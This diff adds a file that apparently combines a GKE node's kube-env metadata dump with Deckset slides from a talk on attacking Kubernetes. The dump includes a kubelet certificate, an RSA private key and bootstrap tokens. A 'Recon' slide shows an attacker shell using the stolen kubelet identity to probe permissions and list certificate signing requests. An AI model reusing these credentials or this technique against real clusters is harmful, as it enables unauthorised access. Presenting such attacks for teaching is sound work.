@@ -1,0 +1,117 @@
+"ALLOCATE_NODE_CIDRS: \"true\"API_SERVER_TEST_LOG_LEVEL: --v=3
+AUTOSCALER_ENV_VARS: kube_reserved=cpu=1060m,memory=1019Mi,ephemeral-storage=41Gi;node_labels=cloud.google.com/gke-boot-disk=pd-standard,cloud.google.com/gke-container-runtime=containerd,cloud.google.com/gke-nodepool=default-pool,cloud.google.com/gke-os-distribution=cos,cloud.google.com/machine-family=e2;os=linux;os_distribution=cos;evictionHard=memory.available=100Mi,nodefs.available=10%,nodefs.inodesFree=5%,pid.available=10%
+CA_CERT: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUVMVENDQXBXZ0F3SUJBZ0lSQUsrMXFNNzBDUFFSWEp5K3lUUVdDU0V3RFFZSktvWklodmNOQVFFTEJRQXcKTHpFdE1Dc0dBMVVFQXhNa01XSXlNMlF6TW1NdE1tUXpNeTAwT1RNekxUazFNVGN0WmpsbE9HWTJNMk16TVRKawpNQ0FYRFRJeE1URXlNekl6TkRFME4xb1lEekl3TlRFeE1URTNNREEwTVRRM1dqQXZNUzB3S3dZRFZRUURFeVF4CllqSXpaRE15WXkweVpETXpMVFE1TXpNdE9UVXhOeTFtT1dVNFpqWXpZek14TW1Rd2dnR2lNQTBHQ1NxR1NJYjMKRFFFQkFRVUFBNElCandBd2dnR0tBb0lCZ1FDNGdMeWxleFBjTTFzN0YydXBvclpQdlltQ2pGNWRXajNUK0J6cgp4MmxlbWRxczJ6U2Myd1YwM3gwWVlQbzRORUVuUklXNVEyTFA0T3NDVEpwRGxEK0xDSk1WVU5sTjVIWVN3MitNCkdrR0VUSUpid3FRc2cvMCt3emJucW91ZnpvMDNkYll1dmhLTitFREtLTUhTZEpQSkY0QkJZa3IvZU90RmpxcU8KVm5GNGRKS0VSai85Y1ZPSHBlcFU5a1pweis0dWZ0S29QZkVPYURIQ0dKaEJmNDhBWnBLaU5La2FuZDVvSjFrNQpTMk93WGpEQndFUTd2NUUwbmFLdWd6dFFNZzJSbU5CNUZWV2RUWDRPTk1sTUE4ZlJzcUhSMkxZQTdmZTFJbG9xCkpTaEpDZE1mVE1YSXRydE9PdG1MMHFrZUdrQ0srR3ZORlJLZUhKSHFvLytLbUIrNStxTU5uTGg0RHRUQnFVZWYKVTJEVjdsQVVrRWZDdVpESDFCd0kxTmpJSWRuM014QkY4eCs5clFqakdtcjlDMElvRkFTbGY3Q2U1UElJcUd6OApyTGZoTXVrcloxT0hzM2NtTk4wemtOMlRabU9OSmE5VzFLWFdKTGRkLy9GM2I1bW5lT2hsS3NSQ3lBbTZUS0c1Ci94d3ZpK3hzRlZDRkJ1OElaSk9GSTljL3B5Y0NBd0VBQWFOQ01FQXdEZ1lEVlIwUEFRSC9CQVFEQWdJRU1BOEcKQTFVZEV3RUIvd1FGTUFNQkFmOHdIUVlEVlIwT0JCWUVGSzN6TEhoalUzUFk4aWlUQTZXOGdKYjYzZDRtTUEwRwpDU3FHU0liM0RRRUJDd1VBQTRJQmdRQ0hFSTdmUkw2d3RueTY4a2hSV0hHTU9ianhzTFBESTZhWWJ1SU1hYTJSCnExdnBlVXFUZHFlbkxuZjNqUHVYaGpuNmhkVGpzMk4xRkQwL0g4M1BJSm9iMG9RM29FNGtvWmlHam1DS01Ua2IKYnJyQUF6cEgxM3BFMFJnUEo5OXNHUFpBQ1hsS3huWWtneHhNRjVyc3EyZjZqbnNWWWdlRld3d3pYZUJZaFRtKwpxclVuMUgrU2ZVVkFaWUk3ZlBCUXlxY2JHV0dqcnMwN1B3NElXUng0cTh2dHRha1dSUkxqdkZGOTIyNlI2VVpxCkg2aHpSZjZuSEdPQm9iK0EvRGpObW9hZ1ladGdOWW5LMlI0dVpBMmZwM3BvRGttYXJyUURYOVZlcGVUcUQ5UloKVktFaUFtS2xoUFoxaER6ZTdWUXo1YWpUSUFzVHdobENGNXVQNEhDMlpCbzZFMU54MXpmL0pRM2JhLzNYTzlURQo3MEVISzZxTG9odmZUd05mNjNOdWF0eGp6MXRwLzhSdGpRMTVqdU9nRVZqd1dFcGZIMXF2MVdFUDBtMTgvUnNwCnVXNVJuMnYzc2p1aGZnSWh1YTBoZUZOaVd0VTZ2RThzK1VOVHdqZ2JsNTNpUnhQTlozVFFKSkVGRDlvR04wTGgKY0VHNFBBRVVFeGhOdktZbnFxL0JVUUk9Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K
+CLUSTER_IP_RANGE: 10.4.0.0/14
+CLUSTER_NAME: cluster-1
+CNI_HASH: 60bec898cffa83ee33023df0ea6001940f222e38d360e6829d05b821cff9921842418441abe8cbb9eada606edf50f0fe5730209311b8be5e035db022db4e3a5f
+CNI_SHA1: dcbeba8d6be7a49e399bda6b8b638d312eace876
+CNI_STORAGE_PATH: https://storage.googleapis.com/gke-release/cni-plugins/v0.8.5-gke.1
+CNI_STORAGE_URL_BASE: https://storage.googleapis.com/gke-release/cni-plugins
+CNI_TAR_PREFIX: cni-plugins-linux-amd64-
+CNI_VERSION: v0.8.5-gke.1
+CONTAINER_RUNTIME: containerd
+CONTAINER_RUNTIME_ENDPOINT: unix:///run/containerd/containerd.sock
+CONTAINER_RUNTIME_NAME: containerd
+CONTAINERD_MAX_CONTAINER_LOG_LINE: \"262144\"
+CREATE_BOOTSTRAP_KUBECONFIG: \"true\"
+DETECT_LOCAL_MODE: NodeCIDR
+DNS_DOMAIN: cluster.local
+DNS_SERVER_IP: 10.8.0.10
+DOCKER_REGISTRY_MIRROR_URL: https://mirror.gcr.io
+ELASTICSEARCH_LOGGING_REPLICAS: \"1\"
+ENABLE_CLUSTER_DNS: \"true\"
+ENABLE_CLUSTER_LOGGING: \"false\"
+ENABLE_CLUSTER_MONITORING: none
+ENABLE_CLUSTER_REGISTRY: \"false\"
+ENABLE_CLUSTER_UI: \"true\"
+ENABLE_L7_LOADBALANCING: glbc
+ENABLE_LATEST_NPD: \"true\"
+ENABLE_METADATA_AGENT: \"\"
+ENABLE_METRICS_SERVER: \"true\"
+ENABLE_NODE_LOGGING: \"false\"
+ENABLE_NODE_PROBLEM_DETECTOR: standalone
+ENABLE_NODELOCAL_DNS: \"false\"
+ENABLE_SYSCTL_TUNING: \"true\"
+ENV_TIMESTAMP: \"2021-11-24T00:41:44+00:00\"
+EXEC_AUTH_PLUGIN_HASH: beb06bc613ac0446b296c20e21d518523ab495efc5a529926474979494bd35be0dbfe7d8d9c3299a120570a7101769710063cb4acac5eda4ee23afaab55dbf1a
+EXEC_AUTH_PLUGIN_LICENSE_URL: https://storage.googleapis.com/gke-prod-binaries/gke-exec-auth-plugin/ca1e685df450fd5d32b57a659eb363b870b03937/LICENSE
+EXEC_AUTH_PLUGIN_SHA1: b42adb3966c4295f17bf3c3f8a2058f4bda684b9
+EXEC_AUTH_PLUGIN_URL: https://storage.googleapis.com/gke-prod-binaries/gke-exec-auth-plugin/ca1e685df450fd5d32b57a659eb363b870b03937/gke-exec-auth-plugin
+EXTRA_DOCKER_OPTS: --insecure-registry 10.0.0.0/8
+FEATURE_GATES: DynamicKubeletConfig=false,RotateKubeletServerCertificate=true
+FLUENTD_CONTAINER_RUNTIME_SERVICE: containerd
+HEAPSTER_USE_NEW_STACKDRIVER_RESOURCES: \"true\"
+HEAPSTER_USE_OLD_STACKDRIVER_RESOURCES: \"false\"
+HPA_USE_REST_CLIENTS: \"true\"
+INSTANCE_PREFIX: gke-cluster-1-a94ebdff
+KUBE_ADDON_REGISTRY: k8s.gcr.io
+KUBE_CLUSTER_DNS: 10.8.0.10
+KUBE_DOCKER_REGISTRY: gke.gcr.io
+KUBE_MANIFESTS_TAR_HASH: 849af02e1c1379df5df95da6e41f7e26bc4c566be10e702fc24691301a048ee40916e1c7ce2ed741c340d8541fe9ffbee9f54c09d5a1fbae16c21758c35af80d
+KUBE_MANIFESTS_TAR_URL: https://storage.googleapis.com/gke-release/kubernetes/release/v1.19.15-gke.500/kubernetes-manifests.tar.gz,https://storage.googleapis.com/gke-release-eu/kubernetes/release/v1.19.15-gke.500/kubernetes-manifests.tar.gz,https://storage.googleapis.com/gke-release-asia/kubernetes/release/v1.19.15-gke.500/kubernetes-manifests.tar.gz
+KUBE_PROXY_TOKEN: h6NDwXmVf80fsxJyEfXEXL0V2pD_Sk2JTKFg6CDLTI4=
+KUBELET_ARGS: --v=2 --experimental-check-node-capabilities-before-mount=true --cloud-provider=gce
+  --experimental-mounter-path=/home/kubernetes/containerized_mounter/mounter --cert-dir=/var/lib/kubelet/pki/
+  --cni-bin-dir=/home/kubernetes/bin --kubeconfig=/var/lib/kubelet/kubeconfig --image-pull-progress-deadline=5m
+  --max-pods=110 --non-masquerade-cidr=0.0.0.0/0 --network-plugin=kubenet --volume-plugin-dir=/home/kubernetes/flexvolume
+  --bootstrap-kubeconfig=/var/lib/kubelet/bootstrap-kubeconfig --node-status-max-images=25
+  --container-runtime=remote --container-runtime-endpoint=unix:///run/containerd/containerd.sock
+  --runtime-cgroups=/system.slice/containerd.service --registry-qps=10 --registry-burst=20
+KUBELET_CERT: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURvVENDQWdtZ0F3SUJBZ0lRYS91Q2FwdXJUY2NSdlE2aXZ1VExPREFOQmdrcWhraUc5dzBCQVFzRkFEQXYKTVMwd0t3WURWUVFERXlReFlqSXpaRE15WXkweVpETXpMVFE1TXpNdE9UVXhOeTFtT1dVNFpqWXpZek14TW1RdwpIaGNOTWpFeE1USTBNREEwTVRRM1doY05Nall4TVRJek1EQTBNVFEzV2pBU01SQXdEZ1lEVlFRREV3ZHJkV0psCmJHVjBNSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQXFYMVZSSVB1WTZKbVdCWEUKQ285eWQrUElJR0d2NFBRUTFmZWFUMWROWlZLanJKSC9JWlF1Y3hwMFk0c245SVV3aHkrV3VjbG9JQ29TNUlMdgpiV0YzRk0zUjkvTW5meVV2UFRaMzVsYk93VTMrbTdtV3MrYzNON1BOZDhYOHF5UzNwTmJDeUtjOVc5Sjg1S1dtCnVYK2h3ejRueWgyWmxmQjdLN3hLb3RXaC9hR1BLNVRzVWlZYTJMREV1bGtVcWNRN1ExNWZJYkJoMFVnQW5VMXAKWmVlKzFzbjd3ZmZBTjJZVi9IZ3N1NEpMRVVtTGU1Z3dtOTlPcUo4Tk9qMW9WdU9UaWJqTW16eFBXd2trODc4LwpRTlFmdFptL0FxT29adDRGZlBjYjRIUFNxMmJXcDBTQmVYeG5SQWhBTk82T01xMkNmNkVYQzgrdDJMcTJWMlJUClV4QlJLUUlEQVFBQm8xWXdWREFPQmdOVkhROEJBZjhFQkFNQ0JhQXdFd1lEVlIwbEJBd3dDZ1lJS3dZQkJRVUgKQXdJd0RBWURWUjBUQVFIL0JBSXdBREFmQmdOVkhTTUVHREFXZ0JTdDh5eDRZMU56MlBJb2t3T2x2SUNXK3QzZQpKakFOQmdrcWhraUc5dzBCQVFzRkFBT0NBWUVBWTI0c25kVUxqSEJiRThoQzg1N2VhV1k2Q3J6MjVjZ1ZtYVNOCk1TS3NDU2Ywc1NWM3V0NEg5VkwrM1NqQUZKUmlCbWpUbk54STdTU3pLNkRIMjZ1T09Rb1JadHBzMFAvWTZqQ2cKUVhHOVZtR1Y1VlNlTm1BNFVYRXdMbjBIYnFYRFR5WGxGbkpLSUxaNGhGVXN0bk9JZXJISDUxb3J4bERwTkFZZgo5Qk5laWJ0MzhjZmppdDFtWjA2OHVGQjdXb3gxdS90SE1uMFl5TVg4Rll0SVR2ZWNXQXMvaTFaWG5OUEFOb045CjJ1OC96dUFkb3RPVjFzY3lFSUM1R0NKTmRGc0haNkkvVFVKTkkwblpQeFZ0ZkZObk4wWFB6ekx2TGozTUlUaTMKNDhiL2ZDcjBZSVU4bFlZQmV5MXJCQ0dUTzRzUUVONzRIc093WFJrOHFxb2tnOE94OG1HNXEweGRtdnBoRks4TwpycGhzZnRkTHEwUmtxUkd4RVVPMDFTSzV1TXdOWXNPYTh5UmRUeHNYdzFGcnBPRElycklMQ3VLekFGTzNCZTFOCnN3NmVxR0FRazJWMjdaSVp4dWkrUnk2SVk3TEhTZkJNRG9LOW16aTlneTJqQkU3MzEzRWVVczM0cWt5V2RRQm0KMDBwWnVSaE05TnJKNHp4c0J2T3FBNWdGVVhDUgotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg==
+KUBELET_KEY: LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBcVgxVlJJUHVZNkptV0JYRUNvOXlkK1BJSUdHdjRQUVExZmVhVDFkTlpWS2pySkgvCklaUXVjeHAwWTRzbjlJVXdoeStXdWNsb0lDb1M1SUx2YldGM0ZNM1I5L01uZnlVdlBUWjM1bGJPd1UzK203bVcKcytjM043UE5kOFg4cXlTM3BOYkN5S2M5VzlKODVLV211WCtod3o0bnloMlpsZkI3Szd4S290V2gvYUdQSzVUcwpVaVlhMkxERXVsa1VxY1E3UTE1ZkliQmgwVWdBblUxcFplZSsxc243d2ZmQU4yWVYvSGdzdTRKTEVVbUxlNWd3Cm05OU9xSjhOT2oxb1Z1T1RpYmpNbXp4UFd3a2s4NzgvUU5RZnRabS9BcU9vWnQ0RmZQY2I0SFBTcTJiV3AwU0IKZVh4blJBaEFOTzZPTXEyQ2Y2RVhDOCt0MkxxMlYyUlRVeEJSS1FJREFRQUJBb0lCQUF6KzJDZmR1Y3lYNmlMOAo0RUF6Q1lMWnkwRjRYQVR5a2N2bUpVWEtHdHdXL3dlL1ZnR2NIQWVsVXFGRFRUZjVjbVFiS1FKcngva1hZTVYyCnFLY0pYeGtRUXZZeEJhbEJENk13NXZhWlYxY0pCT21wekQxVkVDM01Nb2ZwZlZzZUFKcTZBTXRqejFlWUJ3MTkKQ2hDVkViRW50ZU5RYTdOTWNoVkRaYkdna2NBaG45aXJrMDVDbGt3NTJZNFpTbUFQUTZRK0lSRzZWcFliWHJ2dgpEZGl1NmJuNER1ZE5VNVpxcnBxKzBoZGFNYThzSXJISFZ6M281NlJwUnlscWdxMnNCcFBpT3VuK2o2Z0JNMytBCkl2OHZucmpkWk9yalRrcGNNZjNvMlVXOGY3MnZ1RHZjSHJkYmVTcmJWTDVWeURqZ21QQzJtRnpySHBzMHUyVTQKT0tOUlAwVUNnWUVBNzNNd2Y4N0JHekkwWXZaQ0ZmcDh5cHdHTWM3SE1lVXB5VDMySEFMSWxUTy9nMEtWT2pmSwpPOUxXZkkyeDlSL1dIdXlpcGpLbFBTUjJPME95ZW13ZFhMNmlPajJOYjg5eHZ1bHJBcVlsQWxwMWxNUHNKTmhnClJ2cUF5V0RCVVhsTW5hQzMyNyt2eTdiZlVyUmwzbm9WMzBVT0FkdGxGc3VINGRob3hkNUlpQ01DZ1lFQXRUUkYKQ3ZZZzlWRm1WWENaTDlRN2xjUllEeXZxd0NBdnN0a3BkblprTERDdUF2TFFyRGh6TW1ESW5tUG5OVkhNTFhFTgpidFkrQTVlUzIrbTRuMW1sY1ltdktjT01wK0pieEZyeGJiTDBHV2lWdTYzclErUmNORW90QUxPc1VPUGd3ck45Cmx0TlFMQ3NRbUtUdTJxOXVicU13V05GN0VkQW1IVEtJaG9BTGtFTUNnWUVBaWZvU1JGTmJLdFN2SXlkTHhXWmwKYWtxbHR5V3oycWgyZjZQWW9TTnBlYkFyOXZMekVtejdkNlZ5T3F0YmxDZ1lOaEdkVjY5dlQrQW0wTmVkakxXbgo1YjFqdGJPcVFIZUV6OEdwREFtNDRiWkdjc2JDMkNobXNmKy9Ia3RHbWpBUFdmVTJmTVhrQXJzSnpKcHU2TmZvCnFwTWNFeTNjL2xtaG54NFlvWXdJdDRrQ2dZQXZVT1BLZGZTck9rTW5na3h0NGRSaFNqRFlYVlppTHNWbHhURC8KZnZDdlhWTEM4RmF1OGRxYXlBejYxd2x6c2RWSDlHSldrOWtEcFJ1ekV2ZWpuSXdIOXJUbmllbDdtUzd2T2ZRYQorZ1NsY2RyUGRCMmZ6OHlIMXVxamFVZFFwQUIzdHRqUGZvUkwxRDcwTFBVMTQyTkp2cEVNVUQ3N3FzZVpEaTM2Ck9RdEw4d0tCZ1FEVXpzNjlrSEVrWStWMUxDeDFNSm5mQ0tyd1pQdWNGSXluVnFwbWVhZWQvaWlKWUtCa0k2MkoKd1BxS2xjdGwvMHNNMTlHblh2azJMSGM5RUxVU1RDRCtNaWNVWDF0OWZ0ZzZleVh2OHprMC9pRDN1QWkzYkFZNApkM0owY3luYTJJU1d0b2MxcHRKTWhJeVlockdac1RLa2JWMHRFdHMrd1J1NG0yOUF1cE1IckE9PQotLS0tLUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=
+KUBERNETES_MASTER: \"false\"
+KUBERNETES_MASTER_NAME: 34.70.224.152
+LOAD_IMAGE_COMMAND: ctr -n=k8s.io images import
+LOGGING_DESTINATION: \"\"
+LOGGING_STACKDRIVER_RESOURCE_TYPES: \"\"
+MONITORING_FLAG_SET: \"true\"
+NETWORK_PROVIDER: kubenet
+NODE_LOCAL_SSDS_EXT: \"\"
+NODE_PROBLEM_DETECTOR_TOKEN: 2Yx0QvHb1ocNSq80qET1gShn7qHx2li0g2xw7NZAFtI=
+NON_MASQUERADE_CIDR: 0.0.0.0/0
+REMOUNT_VOLUME_PLUGIN_DIR: \"true\"
+REQUIRE_METADATA_KUBELET_CONFIG_FILE: \"true\"
+SALT_TAR_HASH: \"\"
+SALT_TAR_URL: https://storage.googleapis.com/gke-release/kubernetes/release/v1.19.15-gke.500/kubernetes-salt.tar.gz,https://storage.googleapis.com/gke-release-eu/kubernetes/release/v1.19.15-gke.500/kubernetes-salt.tar.gz,https://storage.googleapis.com/gke-release-asia/kubernetes/release/v1.19.15-gke.500/kubernetes-salt.tar.gz
+SERVER_BINARY_TAR_HASH: e47d7f7d415958a9ff047fa15ead1379d1be9d0c01a414e485b4ce1de4830a2fbe8b8e05774653c72147a8be319135eb4d5cdfabb290650aa14ed894f2aa003d
+SERVER_BINARY_TAR_URL: https://storage.googleapis.com/gke-release/kubernetes/release/v1.19.15-gke.500/kubernetes-server-linux-amd64.tar.gz,https://storage.googleapis.com/gke-release-eu/kubernetes/release/v1.19.15-gke.500/kubernetes-server-linux-amd64.tar.gz,https://storage.googleapis.com/gke-release-asia/kubernetes/release/v1.19.15-gke.500/kubernetes-server-linux-amd64.tar.gz
+SERVICE_CLUSTER_IP_RANGE: 10.8.0.0/20
+STACKDRIVER_ENDPOINT: https://logging.googleapis.com
+SYSCTL_OVERRIDES: \"\"
+VOLUME_PLUGIN_DIR: /home/kubernetes/flexvolume
+ZONE: us-central1-c
+
+---
+[.autoscale: false]
+[.header: #F9E166, text-scale(1), Trim Poster]
+[.slidenumber-style: #F9E166, alignment(right), text-scale(1)]
+[.footer-style: #F9E166, alignment(left), text-scale(3)]
+[.text: #FFFFFF, text-scale(.479), Trim Mono]
+[.text-emphasis:  #ECAF3F ]
+[.text-strong:  #25DDC6]
+[.link:  #25DDC6]
+
+[.code-highlight: all]
+<!-- [.code-highlight: 2-3]
+[.code-highlight: 2] -->
+
+### Recon
+
+root@hckd*# khack get pods*
+*Error from server (Forbidden): pods is forbidden: User ["kubelet"](http://wikipedia.com) cannot list resource "pods"*
+in API group "" in the namespace "default"
+
+
+
+```bash
+root@hckd# khack auth can-i get pods
+no
+
+root@hckd*# khack auth can-i get certificatesigningrequests*
+yes
+
+root@hckd*# khack auth-i get csr*
+NAME            SIGNERNAME                    REQUESTOR                                           CONDITION
+node-csr-CW2... kubernetes.io/kube-apiserv... kubelet                                             Approved,Issued
+csr-4r7rg       kubernetes.io/kubelet-serving system:node:gke-cluster-default-pool-751f9550-23c7  Approved,Issued
+```
